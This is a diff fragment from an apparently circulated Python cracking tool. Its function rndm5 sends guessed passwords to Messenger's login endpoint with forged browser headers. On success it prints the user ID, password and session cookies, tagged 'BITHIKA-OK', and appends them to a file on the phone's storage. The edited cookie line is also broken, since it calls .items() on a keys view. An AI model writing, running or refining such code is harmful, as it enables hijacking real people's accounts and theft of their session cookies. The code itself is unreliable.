@@ -1411,10 +1411,10 @@ def rndm5(uid,passlist):
 'Upgrade-Insecure-Requests': '1',
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
 'Content-Length': '417',}
-                        session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
+                        response=session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'some_key' in log_cookies:
-                                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                        coki= ";".join([f"{key}={value}" for key, value in log_cookies.items()])
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
